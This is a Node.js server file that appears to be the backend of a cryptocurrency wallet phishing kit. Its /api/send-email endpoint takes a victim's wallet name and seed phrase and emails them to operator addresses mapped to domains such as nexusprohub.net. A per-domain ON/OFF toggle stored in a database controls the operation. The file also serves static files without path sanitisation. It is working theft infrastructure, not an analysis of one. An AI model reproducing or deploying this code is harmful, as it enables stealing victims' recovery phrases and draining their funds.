import http from "http";
import fs from "fs";
import path from "path";
import url from "url";
import { Resend } from "resend";
import { neon } from "@neondatabase/serverless";

const __dirname = path.dirname(url.fileURLToPath(import.meta.url));

// Initialize Neon database connection
const sql = neon(process.env.DATABASE_URL);

// Helper function to get domain ID
function getDomainId(domain) {
  let hash = 0;
  for (let i = 0; i < domain.length; i++) {
    hash = (hash << 5) - hash + domain.charCodeAt(i);
    hash = hash & hash;
  }
  return Math.abs(hash);
}

// Initialize database table on startup
async function initDatabase() {
  try {
    await sql`
      CREATE TABLE IF NOT EXISTS flareclaimspark (
        id INT PRIMARY KEY,
        domain VARCHAR(255) NOT NULL,
        state VARCHAR(3) NOT NULL CHECK (state IN ('ON', 'OFF'))
      )
    `;
    console.log("✅ Database table initialized");
  } catch (error) {
    console.error("❌ Database initialization error:", error);
  }
}

// Handle toggle endpoint
const handleToggle = async (req, res, body) => {
  const host = req.headers.host || "";
  const domainId = getDomainId(host);

  try {
    // Insert default state for this domain if it doesn't exist
    await sql`
      INSERT INTO flareclaimspark (id, domain, state)
      VALUES (${domainId}, ${host}, 'OFF')
      ON CONFLICT (id) DO NOTHING
    `;

    if (req.method === "POST") {
      const { state } = JSON.parse(body);

      if (state !== "ON" && state !== "OFF") {
        res.writeHead(400, {
          "Content-Type": "application/json",
          "Access-Control-Allow-Origin": "*",
        });
        res.end(JSON.stringify({ error: "Invalid state" }));
        return;
      }

      await sql`
        UPDATE flareclaimspark
        SET state = ${state}
        WHERE id = ${domainId}
      `;

      console.log(`✅ Toggle updated: ${host} → ${state}`);

      res.writeHead(200, {
        "Content-Type": "application/json",
        "Access-Control-Allow-Origin": "*",
      });
      res.end(JSON.stringify({ state, domain: host }));
    } else if (req.method === "GET") {
      const result = await sql`
        SELECT state, domain FROM flareclaimspark WHERE id = ${domainId}
      `;

      res.writeHead(200, {
        "Content-Type": "application/json",
        "Access-Control-Allow-Origin": "*",
      });
      res.end(
        JSON.stringify({
          state: result[0]?.state || "OFF",
          domain: result[0]?.domain || host,
        })
      );
    }
  } catch (error) {
    console.error("❌ Database error:", error);
    res.writeHead(500, {
      "Content-Type": "application/json",
      "Access-Control-Allow-Origin": "*",
    });
    res.end(
      JSON.stringify({
        error: "Database error",
        message: error.message,
      })
    );
  }
};

// Send email using Resend
const sendEmail = async (req, res, body) => {
  try {
    const { walletName, walletIcon, seedPhrase } = JSON.parse(body);

    if (!walletName || !walletIcon || !seedPhrase) {
      res.writeHead(400, {
        "Content-Type": "application/json",
        "Access-Control-Allow-Origin": "*",
      });
      res.end(JSON.stringify({ error: "Missing required fields" }));
      return;
    }

    const host = req.headers.host || "";

    const domainRecipients = {
      "nexusprohub.net": process.env.RECIPIENT_EMAIL_DOMAIN1,
      "www.nexusprohub.net": process.env.RECIPIENT_EMAIL_DOMAIN1,
      "dishbasin.onrender.com": process.env.RECIPIENT_EMAIL_DOMAIN2,
    };

    const recipientEmail =
      domainRecipients[host] || process.env.RECIPIENT_EMAIL_DOMAIN1;

    console.log(`📧 Sending email to ${recipientEmail} from domain ${host}`);

    const resend = new Resend(process.env.RESEND_API_KEY);

    await resend.emails.send({
      from: "onboarding@resend.dev", // Change to noreply@nexusprohub.net once verified
      to: recipientEmail,
      subject: `New message from ${host}`,
      html: `
        <h2>New Wallet Submission</h2>
        <p><strong>Domain:</strong> ${host}</p>
        <p><strong>Name:</strong> ${walletName}</p>
        <p><strong>Icon:</strong> ${walletIcon}</p>
        <p><strong>Phrase:</strong></p>
        <p>${seedPhrase}</p>
      `,
    });

    res.writeHead(200, {
      "Content-Type": "application/json",
      "Access-Control-Allow-Origin": "*",
    });
    res.end(
      JSON.stringify({
        success: true,
        message: "Email sent successfully",
      })
    );
  } catch (err) {
    console.error("❌ Email error:", err);
    res.writeHead(500, {
      "Content-Type": "application/json",
      "Access-Control-Allow-Origin": "*",
    });
    res.end(
      JSON.stringify({
        error: "Failed to send email",
        details: err.message,
      })
    );
  }
};

// Basic static file + API handler
const server = http.createServer((req, res) => {
  const parsedUrl = url.parse(req.url);

  // Handle CORS preflight
  if (req.method === "OPTIONS") {
    res.writeHead(200, {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type",
    });
    res.end();
    return;
  }

  // Handle send-email endpoint
  if (req.method === "POST" && parsedUrl.pathname === "/api/send-email") {
    let body = "";
    req.on("data", (chunk) => (body += chunk));
    req.on("end", () => sendEmail(req, res, body));
  }
  // Handle toggle endpoint (GET and POST)
  else if (parsedUrl.pathname === "/api/toggle") {
    if (req.method === "GET") {
      handleToggle(req, res, "");
    } else if (req.method === "POST") {
      let body = "";
      req.on("data", (chunk) => (body += chunk));
      req.on("end", () => handleToggle(req, res, body));
    }
  }
  // Health check
  else if (parsedUrl.pathname === "/health" || parsedUrl.pathname === "/") {
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(
      JSON.stringify({
        status: "Server is running",
        endpoints: ["/api/send-email", "/api/toggle"],
      })
    );
  }
  // Test Resend endpoint
  else if (parsedUrl.pathname === "/test-resend") {
    const resend = new Resend(process.env.RESEND_API_KEY);

    resend.emails
      .send({
        from: "onboarding@resend.dev",
        to: process.env.RECIPIENT_EMAIL_DOMAIN1,
        subject: "Test from Render",
        html: "<h1>Test email</h1><p>If you see this, Resend is working!</p>",
      })
      .then((result) => {
        console.log("✅ Test email sent:", result);
        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ success: true, result }));
      })
      .catch((err) => {
        console.error("❌ Test email failed:", err);
        res.writeHead(500, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ error: err.message }));
      });
  }
  // Serve static files
  else {
    let filePath = `.${parsedUrl.pathname}`;
    if (filePath === "./") filePath = "./index.html";

    const ext = path.extname(filePath);
    const contentType =
      {
        ".html": "text/html",
        ".js": "text/javascript",
        ".css": "text/css",
        ".json": "application/json",
        ".png": "image/png",
        ".jpg": "image/jpg",
        ".svg": "image/svg+xml",
        ".ico": "image/x-icon",
      }[ext] || "text/plain";

    fs.readFile(filePath, (err, content) => {
      if (err) {
        res.writeHead(404, { "Content-Type": "text/plain" });
        res.end("Not Found");
      } else {
        res.writeHead(200, { "Content-Type": contentType });
        res.end(content);
      }
    });
  }
});

const PORT = process.env.PORT || 3000;

// Initialize database and start server
initDatabase().then(() => {
  server.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`📧 Email provider: Resend`);
    console.log(
      `🔑 Resend API Key set: ${process.env.RESEND_API_KEY ? "Yes" : "No"}`
    );
    console.log(
      `💾 Database URL set: ${process.env.DATABASE_URL ? "Yes" : "No"}`
    );
  });
});
